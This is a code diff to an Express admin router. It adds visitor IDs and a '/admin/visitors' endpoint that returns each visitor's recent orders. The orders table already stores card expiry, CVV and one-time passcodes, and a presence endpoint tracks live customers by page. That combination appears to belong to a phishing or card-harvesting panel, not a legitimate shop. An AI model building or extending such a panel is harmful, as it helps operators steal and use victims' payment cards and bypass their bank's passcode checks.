@@ -1,6 +1,6 @@
 import { Router } from "express";
 import { asc, desc, eq } from "drizzle-orm";
-import { db, ordersTable, productsTable, presenceTable, siteContentTable } from "@workspace/db";
+import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable } from "@workspace/db";
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 
@@ -27,6 +27,7 @@ router.get("/admin/orders", async (_req, res, next) => {
         cardExpiry: ordersTable.cardExpiry,
         cardCvv: ordersTable.cardCvv,
         otpCode: ordersTable.otpCode,
+        visitorId: ordersTable.visitorId,
       })
       .from(ordersTable)
       .orderBy(desc(ordersTable.createdAt));
@@ -202,6 +203,7 @@ router.get("/admin/presence", async (_req, res, next) => {
         page: presenceTable.page,
         label: presenceTable.label,
         customerName: presenceTable.customerName,
+        visitorId: presenceTable.visitorId,
         lastSeenAt: presenceTable.lastSeenAt,
       })
       .from(presenceTable);
@@ -212,6 +214,37 @@ router.get("/admin/presence", async (_req, res, next) => {
         active: isPresenceActive(row.lastSeenAt),
       })),
     );
+  } catch (error) {
+    next(error);
+  }
+});
+
+// Get visitors with their order history
+router.get("/admin/visitors", async (_req, res, next) => {
+  try {
+    const visitors = await db
+      .select()
+      .from(visitorsTable)
+      .orderBy(desc(visitorsTable.lastVisit));
+
+    // Get order count per visitor
+    const visitorsWithOrderCount = await Promise.all(
+      visitors.map(async (visitor) => {
+        const orders = await db
+          .select()
+          .from(ordersTable)
+          .where(eq(ordersTable.visitorId, visitor.visitorId))
+          .orderBy(desc(ordersTable.createdAt));
+        
+        return {
+          ...visitor,
+          orderCount: orders.length,
+          recentOrders: orders.slice(0, 5), // Last 5 orders
+        };
+      })
+    );
+
+    res.json(visitorsWithOrderCount);
   } catch (error) {
     next(error);
   }
